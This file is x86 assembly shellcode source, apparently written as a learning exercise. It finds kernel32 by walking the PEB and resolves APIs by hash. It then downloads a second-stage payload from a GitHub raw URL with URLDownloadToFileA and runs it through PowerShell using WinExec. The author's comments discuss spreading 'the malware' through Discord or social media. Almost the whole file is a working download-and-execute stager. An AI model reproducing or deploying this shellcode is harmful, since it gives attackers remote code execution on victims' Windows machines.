[BITS 32]

mainentrypoint:

call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5] ;adjust for first instruction?

push edx
mov ebx, 0x4b1ffe8e ; kernel32.dll module hash
call get_module_address
pop edx

push ebp
push edx
mov ebp, eax

lea esi, [EDX + KERNEL32HASHTABLE]
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; ######################## USE MODIFIED BELOW ######################

; Call LoadLibaryA to get user32.dll
push ebp
push edx
lea eax, [EDX + USER32]
push eax
call [EDX + LoadLibaryA]
pop edx
pop ebp

; Build user32.dll hash/function table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + USER32HASHTABLE]
lea edi, [EDX + USER32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call LoadLibaryA to get urlmon.dll            ; use LoadLibaryA to grab 
push ebp
push edx
lea eax, [EDX + URLMON]
push eax
call [EDX + LoadLibaryA]
pop edx
pop ebp

; Build urlmon.dll hash/function table
push ebp                                        ; pretty basic here... just building the hash and function tables for...
push edx                                        ; the module urlmon.dll
mov ebp, eax
lea esi, [EDX + URLMONHASHTABLE]                ; this is needed for URLDownloadToFileA
lea edi, [EDX + URLMONFUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; call URLDownloadToFileA and pull next stage
push ebp
push edx
lea ecx, dword [EDX + FILENAME]
lea esi, dword [EDX + URL]
xor ebx, ebx                                    ; NULL
push ebx                                        ; lpfnCB = NULL
push ebx                                        ; dwReserved = NULL
push ecx                                        ; szFileName = C:\Users\mflack\AppData\Local\Temp\payload
push esi                                        ; szURL = https://raw.githubusercontent.com/micahflack/scripts/main/test
push ebx                                        ; pCaller = NULL
push dword [EDX + URLDownloadToFileA]
pop eax
call eax                                        ; URLDownloadToFileA()
pop edx                                         ; MSDocs say more here: https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)
pop ebp

; call winexec api
push ebp
push edx
lea esi, [EDX + EXE]
push 0x01                                       ; show window flag 0x01
push esi                                        ; powershell.exe Invoke-Command -ScriptBlock ([ScriptBlock]::Create((Get-Content $env:TEMP\payload)))
call [EDX + WinExec]                            ; call WinExec
pop edx                                         ; MSDocs say more here: https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)
pop ebp

; MSDocs seen here: https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec

push ebp
push edx
xor esi, esi
xor ecx, ecx
push esi 						
push 'Pwnd'
mov edi, esp
push esi
push 'Yess'
mov ecx, esp
push esi                        ; hWnd = NULL
push edi                        ; the title "dnwP"
push ecx                        ; the message "sseY"
push esi                        ; uType = NULL
call [EDX + MessageBoxA]
add esp, 0x10
pop edx
pop ebp

push esi
call [EDX + MessageBeep]

; ######################## USE MODIFIED ABOVE ######################


; returns module base in EAX
; EBP = Hash of desired module
get_module_address:

;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20
end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:

cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop

ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

URL:
    db "https://raw.githubusercontent.com/micahflack/scripts/main/powershell_pop_calc.txt", 0x00
    ; link to my personal github repo that I use for scripts - allows me to easily change the payload distributed
    ; another option would have been to upload the payload to Discord and then use their share link to distribute
    ; the malware... social media leaves plenty of options.

EXE:
    db "powershell.exe Invoke-Command -ScriptBlock ([ScriptBlock]::Create((Get-Content $env:TEMP\payload)))", 0x00
    ; navigate to the users's %TEMP% folder and run the contents of the downloaded payload

FILENAME:
    db "C:\Users\mflack\AppData\Local\Temp\payload", 0x00
    ; I wanted to do this differently with GetTempPathA + FILENAME, but it wasn't working well...

KERNEL32HASHTABLE:
    dd 0xc8ac8026 ; LoadLibaryA
	dd 0xe8bf6dad ; WinExec
	dd 0xFFFF

KERNEL32FUNCTIONSTABLE:
LoadLibaryA:
    dd 0x00000000
WinExec:
    dd 0x00000001

USER32HASHTABLE:
    dd 0xabbc680d ; MessageBoxA
    dd 0xabbee6bc ; MessageBoxA
	dd 0xFFFF

USER32FUNCTIONSTABLE:
MessageBoxA:
    dd 0x00000002
MessageBeep:
    dd 0x00000003

URLMONHASHTABLE:
    dd 0xd95d2399 ; URLDownloadToFileA
	dd 0xFFFF

URLMONFUNCTIONSTABLE:
URLDownloadToFileA:
    dd 0x00000004

USER32:
    db "user32.dll", 0x00

URLMON:
    db "urlmon.dll", 0x00

    ; I didn't really change much here other than adding the hashed api, of course...
    ; I had tried messing with msvcrt.dll to use mshta.exe to download my "2nd" stage, but
    ; URLDownloadToFileA ended up being way easier...

    ; Another option I was considering was something along the lines of using WININET, it's
    ; possible to manually make the calls to HTTP Open\Connect\Send\Receive...
    ; https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-sessions-overview